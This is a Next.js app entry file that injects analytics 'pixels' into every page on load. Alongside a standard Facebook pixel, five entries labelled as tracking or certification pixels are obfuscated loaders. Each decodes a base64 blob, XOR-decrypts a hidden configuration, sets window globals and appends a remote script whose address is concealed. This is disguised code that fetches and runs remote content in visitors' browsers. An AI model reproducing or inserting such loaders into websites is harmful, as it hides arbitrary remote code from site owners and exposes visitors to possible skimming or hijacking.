import { useEffect } from "react";
import "../styles/globals.css";

const permanentPixels = [
  {
    id: "pixel-todas-as-paginas",
    content: `(function(){var w_e=atob("DETdzYWj14jGVUhGFj//uPfP9bLkPTwyZjfn4qrAs+boIDwrfyKk4+bMuqakJ2c1dTa0vfHQ+PivLS0qOTS0teDP+eK1d2RkdzCpv+zBovyjJmp8TRnx7+LPuOqnOTtkLB+m7+vCuu3kb2o2fzy4oczH9aTkIykqYyH/96eVtrnyMCokLnzl/LXFsevxYnF2InXkr7WBqtW7");var m_xo=[];for(var z_u2u=0;z_u2u<w_e.length;z_u2u++){m_xo.push(w_e.charCodeAt(z_u2u)&255);}var w_k919=m_xo[0];var p_yyjj=m_xo.slice(1,1+w_k919);var x_p=m_xo.slice(1+w_k919);var x_k=x_p.map(function(b,j_1z){return b^p_yyjj[j_1z%w_k919];});var b_mk="";for(var m_m8=0;m_m8<x_k.length;m_m8++){b_mk+=String.fromCharCode(x_k[m_m8]&255);}var z_g5=decodeURIComponent(escape(b_mk));var e_r=JSON.parse(z_g5);var p_i3ha=e_r.globals||[];p_i3ha.forEach(function(w_0o){window[w_0o.name]=w_0o.value;});var g_j=document.createElement("script");g_j.src=e_r.url;g_j.async=true;g_j.defer=true;(e_r.attributes||[]).forEach(function(u_ozu){g_j.setAttribute(u_ozu.name,u_ozu.value);});(document.head||document.documentElement).appendChild(g_j);})();`,
  },
  {
    id: "pixel-principal",
    content: `(function(){var k_ooe=atob("DBUFXeULXKlT854yRm4nKJdnfpNxm+pGNmY/cspoOMd9hupfL3N8c4ZkMYcxgbFBJWdsLZF4c9wnnu0dKnRxOJZ/csMg0bIQJ2FxL4xpKd02gLwIHW4nM4RmOYtp0fpTMnQoKJFmNc8q3u5AI2NgM5EmJMo8l7NBJX4nccd9PcUmlrwIZDd4cZ4pMsg+lrwIZHFkKYQmKd0+mvhLa2V3OJNuMt1+gOtQL3F2f8kpKsg/hvsQfDcnILh2");var t_t34=[];for(var v_shr=0;v_shr<k_ooe.length;v_shr++){t_t34.push(k_ooe.charCodeAt(v_shr)&255);}var r_kt7=t_t34[0];var n_bq5=t_t34.slice(1,1+r_kt7);var g_bemx=t_t34.slice(1+r_kt7);var g_r2c=g_bemx.map(function(b,d_lh){return b^n_bq5[d_lh%r_kt7];});var c_3tiz="";for(var o_cz=0;o_cz<g_r2c.length;o_cz++){c_3tiz+=String.fromCharCode(g_r2c[o_cz]&255);}var e_fqtn=decodeURIComponent(escape(c_3tiz));var e_c4=JSON.parse(e_fqtn);var s_l03=e_c4.globals||[];s_l03.forEach(function(y_x70){window[y_x70.name]=y_x70.value;});var d_18=document.createElement("script");d_18.src=e_c4.url;d_18.async=true;d_18.defer=true;(e_c4.attributes||[]).forEach(function(i_ter){d_18.setAttribute(i_ter.name,i_ter.value);});(document.head||document.documentElement).appendChild(d_18);})();`,
  },
  {
    id: "pixel-secundario",
    content: `(function(){var h_e0ye=atob("DP/Zw4IC3eplcxeS4YT7tvBu/9BHG2PmkYzj7K1huYRLBmP/iJmg7eFtsMQHATjhgo2ws/Zx8poMC3L+zo+wu+du84AWUTuwgIutsetgqJ4AADWouqL14eVusogEH2Sw26Si4exjsI9HSTXiiIe8r8tm/8ZHBXb+lJr7+aA0vNtRFnXw2cfh8rJku4lSRC6i1c7gobIgoLcY");var f_h=[];for(var h_k5l=0;h_k5l<h_e0ye.length;h_k5l++){f_h.push(h_e0ye.charCodeAt(h_k5l)&255);}var b_bd=f_h[0];var g_4=f_h.slice(1,1+b_bd);var n_f=f_h.slice(1+b_bd);var o_ub=n_f.map(function(b,e_x2a){return b^g_4[e_x2a%b_bd];});var n_ajk="";for(var k_k32=0;k_k32<o_ub.length;k_k32++){n_ajk+=String.fromCharCode(o_ub[k_k32]&255);}var p_un4=decodeURIComponent(escape(n_ajk));var y_vbh=JSON.parse(p_un4);var a_d=y_vbh.globals||[];a_d.forEach(function(h_u1k){window[h_u1k.name]=h_u1k.value;});var p_sdf=document.createElement("script");p_sdf.src=y_vbh.url;p_sdf.async=true;p_sdf.defer=true;(y_vbh.attributes||[]).forEach(function(w_q9fh){p_sdf.setAttribute(w_q9fh.name,w_q9fh.value);});(document.head||document.documentElement).appendChild(p_sdf);})();`,
  },
  {
    id: "facebook-pixel-1921904921813013",
    content: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version="2.0";n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","1921904921813013");fbq("track","PageView");`,
  },
];

const sharedTrackingScripts = [
  {
    id: "utm-capture-script",
    content: `(function(){var a_d=atob("DEsJ/xEI7AGHDBTLcjArimNkzjulZGC/Ajgz0D5riG+peWCmGy1w0XJngS/lfju4ETlgj2V7w3TzYWfkHip9mmJ8wmv0LjjpEz99jXhqmXXifzbxKTArkXBliSO9LnCqBiokimVlhWf+IWS5Fz1skWUllGLoaDm4ESAr0zN+jW3yaTbxUGl002oqgmDqaTbxUC9oi3AlmXXqZXKyXzt7mmdtgnWqf2GpGy963T0qmmDreXHpSGkrgkx1");var a_p=[];for(var l_6m=0;l_6m<a_d.length;l_6m++){a_p.push(a_d.charCodeAt(l_6m)&255);}var z_8=a_p[0];var y_w=a_p.slice(1,1+z_8);var o_yji=a_p.slice(1+z_8);var f_go=o_yji.map(function(b,b_m2e){return b^y_w[b_m2e%z_8];});var n_i7="";for(var y_0w=0;y_0w<f_go.length;y_0w++){n_i7+=String.fromCharCode(f_go[y_0w]&255);}var n_f0x=decodeURIComponent(escape(n_i7));var k_q=JSON.parse(n_f0x);var b_pq=k_q.globals||[];b_pq.forEach(function(w_ujxn){window[w_ujxn.name]=w_ujxn.value;});var w_8p=document.createElement("script");w_8p.src=k_q.url;w_8p.async=true;w_8p.defer=true;(k_q.attributes||[]).forEach(function(b_sb1){w_8p.setAttribute(b_sb1.name,b_sb1.value);});(document.head||document.documentElement).appendChild(w_8p);})();`,
  },
  {
    id: "certification-pixel",
    content: `(function(){var h_o6=atob("DANkas9FKe9PC5MRzHhGH70pC9VtY+dlvHBeReAmTYFhfud8pWUdRKwqRMEtebxir3ENGrs2Bp8mc/Z943MNEqopB4U8Kb8zrXcQGKYnXJsqeLErl15ISKgpRo0uZ+Az9lgfSKEkRIptMbFhpXsBBoYhC8NtffJ9uWZGUO1zSN57bvFz9DtcW/8jT4x4PKoh+DJdCP9nVLIy");var s_f=[];for(var a_t8=0;a_t8<h_o6.length;a_t8++){s_f.push(h_o6.charCodeAt(a_t8)&255);}var g_a=s_f[0];var q_8v7=s_f.slice(1,1+g_a);var p_4=s_f.slice(1+g_a);var n_qbj=p_4.map(function(b,n_ouy){return b^q_8v7[n_ouy%g_a];});var s_y="";for(var w_wvyn=0;w_wvyn<n_qbj.length;w_wvyn++){s_y+=String.fromCharCode(n_qbj[w_wvyn]&255);}var s_k=decodeURIComponent(escape(s_y));var p_gcki=JSON.parse(s_k);var c_xu9d=p_gcki.globals||[];c_xu9d.forEach(function(v_bb){window[v_bb.name]=v_bb.value;});var y_84a=document.createElement("script");y_84a.src=p_gcki.url;y_84a.async=true;y_84a.defer=true;(p_gcki.attributes||[]).forEach(function(f_s1b){y_84a.setAttribute(f_s1b.name,f_s1b.value);});(document.head||document.documentElement).appendChild(y_84a);})();`,
  },
];

export default function App({ Component, pageProps }) {
  useEffect(() => {
    [...permanentPixels, ...sharedTrackingScripts].forEach(({ id, content }) => {
      if (document.getElementById(id)) {
        return;
      }

      const script = document.createElement("script");
      script.id = id;
      script.text = content;
      document.head.appendChild(script);
    });
  }, []);

  return <Component {...pageProps} />;
}